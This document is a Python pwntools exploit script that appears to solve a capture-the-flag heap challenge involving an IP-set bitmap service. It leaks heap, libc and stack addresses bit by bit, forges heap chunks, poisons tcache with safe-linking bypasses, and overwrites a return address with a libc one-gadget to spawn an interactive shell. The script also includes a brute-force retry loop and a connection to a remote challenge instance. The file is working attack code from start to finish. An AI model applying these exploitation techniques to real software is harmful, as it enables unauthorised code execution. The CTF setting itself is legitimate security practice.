from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess
from itertools import *
from more_itertools import *

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = './chal'
exe_args = []
PREFIX = b":"
speed = 0.2

io: process = None

def debug(pid=io):
    gdb.attach(pid, gdbscript=
    """
    
    """, exe=file)
    input("debug")

def launch_remote():
    global file, io
    io = process(["./nc.openbsd", *("-X connect -x instance.penguin.0ops.sjtu.cn:18081 mm7kyp3bx67rwjcr 1".split(" "))])

def launch_docker():
    global file, io
    io = remote("localhost", 1234)
    if args.GDB:
        out = subprocess.run(["pgrep", "--newest", file], capture_output=True)
        debug(int(out.stdout))

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug(io)

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
slaprefix = lambda a: sla(PREFIX, a)
saprefix = lambda a: sa(PREFIX, a)
choice = lambda a: snum(PREFIX, a)
show_leak = lambda a, b: success("%s: %#018x" % (a, b))

def launch():
    if args.REMOTE:
        l = launch_remote
    elif args.DOCKER:
        l = launch_docker
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]
def getr(d, p):
    return re.findall(p, d)[0]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF('libc.so.6')

import socket
from math import log2
start_ip = end_ip = 0

tries = 0
def exploit():
    def num2ip(n):
        return socket.inet_ntoa(struct.pack('!L', n)).encode()
    def choose(num):
        return str(num).encode().ljust(0xf, b"\0")

    def add_ip_set(start, end):
        global start_ip, end_ip
        start_ip, end_ip = start, end
        payload = b""
        payload += choose(1)
        payload += num2ip(start).ljust(0x1f, b"\0")
        payload += num2ip(end).ljust(0x1f, b"\0")
        io.send(payload)
        # choice(1)
        # slaprefix(num2ip(start))
        # slaprefix(num2ip(end))
    def set_bit(offset, bit, v):
        choice(3 if v == 0 else 2)

        slaprefix(num2ip(start_ip + offset*8 + bit))
    def manual_set_bit(offset, bit, v):
        payload = choose(2 if v == 1 else 3)
        payload += num2ip(start_ip + offset*8 + int(log2(bit+1))).ljust(0x2f, b"\0")
        # io.send(payload)
        return payload
        # choice(3 if v == 0 else 2)

        # slaprefix(num2ip(start_ip + offset*8 + int(log2(bit+1))).ljust(0x2f, b"\0"))
    def set_byte(offset, v):
        for i in range(8):
            set_bit(offset, i, (v >> i) & 1)
    def set_addr(offset, ptr):
        global start_ip
        payload = b""
        for i in range(48):
            payload += choose(3 if ((ptr >> i) & 1) == 0 else 2)
            payload += num2ip(start_ip + (offset+i//8)*8 + (i%8)).ljust(0x2f, b"\0")
            # print(payload)
            if i % 8 == 0:
                io.send(payload)
                payload = b""
                sleep(0.5)
        # print(payload)
        io.send(payload)
        sleep(0.5)
        # for i in range(6):
        #     set_byte(offset+i, (ptr >> i*8) & 0xff)
    def set_64(offset, v):
        for i in range(8):
            set_byte(offset+i, (v >> i*8) & 0xff)


    def set_bit_range(data, v):
        if type(data) == str:
            data = data.encode()
        
        payload = choose(2 if v == 1 else 3)
        payload += data.ljust(0x2f, b"\0")
        io.send(payload)
        # choice(2 if v == 1 else 3)
        # slaprefix(payload)

    def show_bit(offset, bit):
        io.send(b"4".ljust(0xf, b"\0"))
        # sleep(0.6)
        sl(num2ip(start_ip + offset*8 + bit).ljust(0x1f, b"\0"))
        # sleep(0.6)
        return 1
        # return b"not" not in recvu(b"1. Create IP Set")
    def show_bits(offset, bits):
        global start_ip
        value = 0
        payload = b""
        for i in range(bits):
            payload += b"4".ljust(0xf, b"\0")
            payload += num2ip(start_ip + (offset+i//8)*8 + (i%8)).ljust(0x1f, b"\0")
            if i % 8 == 0:
                io.send(payload)
                payload = b""
                sleep(0.1)
            # show_bit(offset + i//8, i%8)
        io.send(payload)
        recvu(b"IP is")
        # recvu(b"1. Create")
        for i in range(bits):
            if b"not" not in recvu(b"1. Create IP Set"):
                value |= 1 << i
        return value
    
    def free_ip_range():
        io.send(choose(5))
        # choice(5)


    start = 0
    # add_ip_set(start, ((0x218-1)<<3)+start)
    # free_ip_range()
    # add_ip_set(start, ((0x218-1)<<3)+start)

    # # io.send(b"4".ljust(0xf, b"\0") + num2ip(start_ip + 0*8 + 0).ljust(0x1f, b"\0"))

    # heap = show_bits(0, 48) << 12
    # show_leak("heap", heap)


    # io.interactive()

    # a = time.time()

    # add_ip_set(start, ((0x228-1)<<3)+start)
    # free_ip_range()
    add_ip_set(start, ((0x218-1)<<3)+start)
    free_ip_range()
    add_ip_set(start, ((0x218-1)<<3)+start)
    heap = show_bits(0, 48) << 12
    show_leak("heap", heap)
    free_ip_range()

    # print(a - time.time())


    start = 0x3d
    add_ip_set(start, ((0xdf8-1)<<3)+start)
    
    payload = b""
    payload += manual_set_bit(0x600-0x8, 0, 1)
    payload += manual_set_bit(0x600-0x8, 0x20, 1)
    payload += manual_set_bit(0x620-0x8, 0, 1)
    io.send(payload)
    # manual_set_bit(0x600-0x8, 0, 1)
    # manual_set_bit(0x600-0x8, 0x20, 1)
    # manual_set_bit(0x620-0x8, 0, 1)

    set_bit_range(f"{start}/26", 0)
    free_ip_range()


    start = 0
    add_ip_set(start, ((0x5f8-1)<<3)+start)
    libc.address = show_bits(0, 48) - 0x21ace0
    show_leak("libc", libc.address)



    start = 0x3c
    add_ip_set(start, ((0x1d18-1)<<3)+start)
    payload = b""
    payload += manual_set_bit(0xc20-0x8, 0, 1)
    payload += manual_set_bit(0xc20-0x8, 0x20, 1)
    payload += manual_set_bit(0xc40-0x8, 0, 1)
    io.send(payload)
    set_bit_range(f"{start}/26", 0)
    free_ip_range()


    coal = 0x1920

    start = 0x3e
    add_ip_set(start, ((0xe18-1)<<3)+start)
    set_addr(0x10, coal)
    payload = b""
    payload += manual_set_bit(0x18, 0x20, 1)
    payload += manual_set_bit(0x10+0x20, 0, 1)
    io.send(payload)
    set_bit_range(f"{start}/26", 0)
    free_ip_range()
    # start = 0x3e
    # add_ip_set(start, ((0xe28-1)<<3)+start)
    # set_addr(0x10, coal)
    # manual_set_bit(0x18, 0x20, 1)
    # manual_set_bit(0x10+0x20, 0, 1)
    # set_bit_range(f"{start}/26", 0)
    # free_ip_range()


    begin = heap+0x290+0x220+0xe00
    # coal = 0x2740

    start = 0x3d
    add_ip_set(start, ((0xc18-1)<<3)+start)
    set_addr(0x20, begin+0x420)
    io.send(manual_set_bit(0x420-0x8, 0, 1))
    set_addr(0x420-0x8, coal | 1)
    set_addr(0x428-0x8, begin+0x20-8)
    set_addr(0x430-0x8, begin+0x20)
    set_bit_range(f"{start}/26", 0)
    free_ip_range()
    

    start = 0
    add_ip_set(start, ((0x1d38-1)<<3)+start)
    set_addr(0x1d20, safe_link(begin+0x1d20+0x10, heap+0x10))
    # set_addr(0x1d20, safe_link(begin+0x1d20+0x10, libc.sym[""]))


    # free_ip_range()
    # start = 0x7f
    # add_ip_set(start, ((0xa8-1)<<3)+start)

    # set_bit_range(f"{start}/25", 1)
    # set_bit_range(f"{start}/26", 0)


    add_ip_set(start, ((0x218-1)<<3)+start)
    add_ip_set(start, ((0x218-1)<<3)+start)

    payload = b""
    payload += manual_set_bit(0, 0, 1) # 0x20
    payload += manual_set_bit(0x20, 0, 1) # 0x120
    io.send(payload)
    set_addr(0x80, libc.sym.environ)
    set_addr(0x80+(0x20//2)*8, heap+0x10)


    add_ip_set(start, ((0x18-1)<<3)+start)
    environ = show_bits(0, 48)
    show_leak("environ", environ)

    add_ip_set(start, ((0x118-1)<<3)+start)
    io.send(manual_set_bit(0x20, 0, 1)) # 0x120
    off = 0xf0
    set_addr(0x80+(0x20//2)*8, environ-0x178-off)

    start = 0
    add_ip_set(start, ((0x118-1)<<3)+start)
    set_addr(off+0x10, libc.address+0xebd3f)


    # set_bit(0x58, 6, 1)
    set_bit_range(f"{(off+8)*8+6}-{(off+8)*8+7}", 1)




    # set_addr(0x20, binsh())

    # pause()

    # start = 0x3d
    # add_ip_set(start, ((0xdf8-1)<<3)+start)
    # set_bit_range(f"{start}/26", 0)
    # free_ip_range()

    io.interactive()
    exit()

if not args.BF:
    launch()
    exploit()
    exit()
else:
    tries_prog = log.progress("Tries")
    while True:
        count = 0
        tries += 1
        tries_prog.status(str(tries))

        launch()
        try:
            exploit()
        except EOFError:
            pass

        with context.local(log_level=logging.ERROR):
            io.close()
        # sleep(0.05)
